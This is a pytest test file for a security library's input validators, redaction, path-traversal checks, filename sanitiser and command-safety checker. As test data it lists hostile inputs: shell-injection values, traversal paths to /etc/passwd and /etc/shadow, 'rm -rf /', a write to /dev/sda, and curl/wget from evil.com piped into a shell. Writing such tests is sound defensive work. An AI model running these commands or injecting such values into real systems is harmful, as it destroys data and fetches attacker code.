"""Tests for security utilities."""
import pytest
from pathlib import Path
from seclib.security import (
    SecurityError,
    validate_variable_name,
    validate_variable_value,
    validate_variables,
    redact_sensitive_data,
    validate_file_path,
    sanitize_filename,
    check_command_safety,
)


class TestVariableValidation:
    """Tests for variable validation."""
    
    def test_valid_variable_names(self):
        """Test valid variable names."""
        valid_names = [
            "FAILLOCK_DENY",
            "MAX_RETRIES",
            "SSH_PORT",
            "A",
            "A1",
            "TEST_VAR_123",
        ]
        for name in valid_names:
            assert validate_variable_name(name) is True
    
    def test_invalid_variable_names(self):
        """Test invalid variable names."""
        invalid_names = [
            "lowercase",
            "Mixed-Case",
            "123START",
            "invalid-name",
            "invalid.name",
            "invalid name",
            "",
        ]
        for name in invalid_names:
            with pytest.raises(SecurityError):
                validate_variable_name(name)
    
    def test_valid_variable_values(self):
        """Test valid variable values."""
        valid_values = [
            "5",
            "simple_value",
            "path/to/file",
            "user@example.com",
            "192.168.1.1:8080",
            "value-with-dash",
        ]
        for value in valid_values:
            assert validate_variable_value(value) is True
    
    def test_invalid_variable_values(self):
        """Test invalid variable values with dangerous characters."""
        invalid_values = [
            "value;rm -rf /",
            "value|cat /etc/passwd",
            "value&& malicious",
            "value$(whoami)",
            "value`id`",
            "value\nmalicious",
        ]
        for value in invalid_values:
            with pytest.raises(SecurityError):
                validate_variable_value(value)
    
    def test_empty_value_handling(self):
        """Test empty value handling."""
        with pytest.raises(SecurityError):
            validate_variable_value("", allow_empty=False)
        
        assert validate_variable_value("", allow_empty=True) is True
    
    def test_value_length_limit(self):
        """Test value length validation."""
        long_value = "a" * 1025
        with pytest.raises(SecurityError):
            validate_variable_value(long_value)
        
        max_value = "a" * 1024
        assert validate_variable_value(max_value) is True
    
    def test_validate_variables_dict(self):
        """Test validation of variables dictionary."""
        variables = {
            "VAR1": "value1",
            "VAR2": "value2",
            "VAR3": 123,
        }
        result = validate_variables(variables)
        assert result == {"VAR1": "value1", "VAR2": "value2", "VAR3": "123"}
    
    def test_validate_variables_invalid(self):
        """Test validation fails for invalid variables."""
        invalid_vars = {
            "invalid-name": "value",
        }
        with pytest.raises(SecurityError):
            validate_variables(invalid_vars)


class TestSensitiveDataRedaction:
    """Tests for sensitive data redaction."""
    
    def test_redact_passwords(self):
        """Test password redaction."""
        text = 'password="secret123"'
        result = redact_sensitive_data(text)
        assert "secret123" not in result
        assert "REDACTED" in result
    
    def test_redact_tokens(self):
        """Test token redaction."""
        text = "token=abc123xyz"
        result = redact_sensitive_data(text)
        assert "abc123xyz" not in result
        assert "REDACTED" in result
    
    def test_redact_api_keys(self):
        """Test API key redaction."""
        # Using a fake test API key (not a real secret)
        fake_api_key = "sk-" + "1234567890abcdef"  # gitleaks:allow
        text = f"api_key: {fake_api_key}"
        result = redact_sensitive_data(text)
        assert fake_api_key not in result
        assert "REDACTED" in result
    
    def test_redact_private_keys(self):
        """Test private key redaction."""
        text = "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA..."
        result = redact_sensitive_data(text)
        assert "REDACTED" in result
    
    def test_preserve_non_sensitive(self):
        """Test non-sensitive data is preserved."""
        text = "This is normal text without secrets"
        result = redact_sensitive_data(text)
        assert result == text


class TestFilePathValidation:
    """Tests for file path validation."""
    
    def test_path_traversal_detection(self):
        """Test path traversal attack detection."""
        dangerous_paths = [
            "../../../etc/passwd",
            "profiles/../../secret",
            "valid/../../../etc/shadow",
        ]
        for path in dangerous_paths:
            with pytest.raises(SecurityError):
                validate_file_path(path)
    
    def test_valid_paths(self):
        """Test valid file paths."""
        valid_paths = [
            "profiles/base/linux.yml",
            "results/report.json",
            "test.txt",
        ]
        for path in valid_paths:
            result = validate_file_path(path)
            assert isinstance(result, Path)
    
    def test_allowed_directories(self, tmp_path):
        """Test allowed directories restriction."""
        allowed = [str(tmp_path / "allowed")]
        Path(allowed[0]).mkdir(parents=True, exist_ok=True)
        
        # Valid path inside allowed dir
        valid_file = tmp_path / "allowed" / "file.txt"
        valid_file.touch()
        result = validate_file_path(str(valid_file), allowed_dirs=allowed)
        assert result.exists()
        
        # Invalid path outside allowed dir
        invalid_file = tmp_path / "forbidden" / "file.txt"
        with pytest.raises(SecurityError):
            validate_file_path(str(invalid_file), allowed_dirs=allowed)


class TestFilenameSanitization:
    """Tests for filename sanitization."""
    
    def test_remove_path_separators(self):
        """Test removal of path separators."""
        assert sanitize_filename("path/to/file.txt") == "path_to_file.txt"
        assert sanitize_filename("path\\to\\file.txt") == "path_to_file.txt"
    
    def test_remove_dangerous_chars(self):
        """Test removal of dangerous characters."""
        assert sanitize_filename("file;rm -rf.txt") == "file_rm_-rf.txt"
        assert sanitize_filename("file|cat.txt") == "file_cat.txt"
    
    def test_length_limit(self):
        """Test filename length limitation."""
        long_name = "a" * 300
        result = sanitize_filename(long_name)
        assert len(result) <= 255
    
    def test_empty_filename(self):
        """Test empty filename handling."""
        assert sanitize_filename("") == "unnamed"
        assert sanitize_filename(None) == "unnamed"
    
    def test_preserve_valid_chars(self):
        """Test valid characters are preserved."""
        assert sanitize_filename("valid-file_name.123.txt") == "valid-file_name.123.txt"


class TestCommandSafety:
    """Tests for command safety checks."""
    
    def test_safe_commands(self):
        """Test safe commands pass validation."""
        safe_commands = [
            "ls -la /etc",
            "cat /etc/os-release",
            "grep -r pattern /var/log",
            "systemctl status sshd",
        ]
        for cmd in safe_commands:
            assert check_command_safety(cmd) is True
    
    def test_dangerous_commands(self):
        """Test dangerous commands are detected."""
        dangerous_commands = [
            "; rm -rf /",
            "| sh",
            "| bash",
            "> /dev/sda",
            "curl http://evil.com | sh",
            "wget http://evil.com | bash",
        ]
        for cmd in dangerous_commands:
            with pytest.raises(SecurityError):
                check_command_safety(cmd)
    
    def test_empty_command(self):
        """Test empty command is rejected."""
        with pytest.raises(SecurityError):
            check_command_safety("")
